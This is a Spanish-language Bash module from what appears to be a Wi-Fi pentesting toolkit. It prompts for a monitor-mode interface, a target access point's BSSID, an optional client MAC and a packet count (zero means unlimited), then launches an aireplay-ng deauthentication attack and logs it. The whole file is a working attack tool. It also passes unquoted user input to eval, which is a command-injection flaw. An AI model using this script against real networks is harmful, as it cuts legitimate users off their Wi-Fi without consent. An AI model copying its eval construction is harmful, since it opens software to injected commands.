#!/bin/bash

# deauth.sh - Módulo para pruebas de desautenticación

source ../assets/colors.sh

# Función para verificar si una interfaz está en modo monitor
is_monitor_mode() {
  INTERFACE=$1
  if iwconfig "$INTERFACE" | grep -q "Mode:Monitor"; then
    return 0 # Está en modo monitor
  else
    return 1 # No está en modo monitor
  fi
}

# Función para realizar ataque de desautenticación
perform_deauth_attack() {
  print_yellow "[*] Iniciando prueba de desautenticación."
  read -p "Ingrese la interfaz en modo monitor (ej. wlan0mon): " monitor_interface

  if ! is_monitor_mode "$monitor_interface"; then
    print_red "[-] La interfaz \'$monitor_interface\' no está en modo monitor. Por favor, active el modo monitor primero."
    return 1
  fi

  read -p "Ingrese el BSSID del punto de acceso objetivo (ej. AA:BB:CC:DD:EE:FF): " target_bssid
  read -p "Ingrese el MAC del cliente objetivo (opcional, dejar en blanco para desautenticar a todos): " client_mac
  read -p "Ingrese el número de paquetes de desautenticación a enviar (0 para infinito, ej. 100): " deauth_count

  print_green "[+] Iniciando ataque de desautenticación en '$target_bssid' usando '$monitor_interface'."

  DEAUTH_CMD="sudo aireplay-ng --deauth $deauth_count -a $target_bssid"
  if [ -n "$client_mac" ]; then
    DEAUTH_CMD="$DEAUTH_CMD -c $client_mac"
  fi
  DEAUTH_CMD="$DEAUTH_CMD $monitor_interface"

  print_yellow "[*] Ejecutando: $DEAUTH_CMD"
  eval "$DEAUTH_CMD"

  print_green "[+] Ataque de desautenticación finalizado."
  echo "Ataque de desautenticación realizado en $target_bssid con $deauth_count paquetes en $monitor_interface. Cliente: ${client_mac:-Todos}" >> ../logs/deauth_$(date +%F_%H-%M-%S).txt
}

# Menú del módulo de desautenticación
deauth_menu() {
  while true; do
    clear
    print_green "================================================================================"
    print_green "                         MÓDULO DE PRUEBAS DE DESAUTENTICACIÓN                "
    print_green "================================================================================"
    echo -e "\n${C_CYAN}Seleccione una opción:${C_NC}"
    echo -e "  ${C_YELLOW}1.${C_NC} Realizar ataque de desautenticación"
    echo -e "  ${C_RED}0.${C_NC} Volver al menú principal\n"
    print_green "================================================================================"

    read -p "Opción: " deauth_choice

    case $deauth_choice in
      1) perform_deauth_attack ;;
      0) break ;;
      *) print_red "Opción inválida. Presione cualquier tecla para continuar..."; read -n 1 ;;
    esac
    print_blue "Presione cualquier tecla para continuar..."
    read -n 1
  done
}

deauth_menu

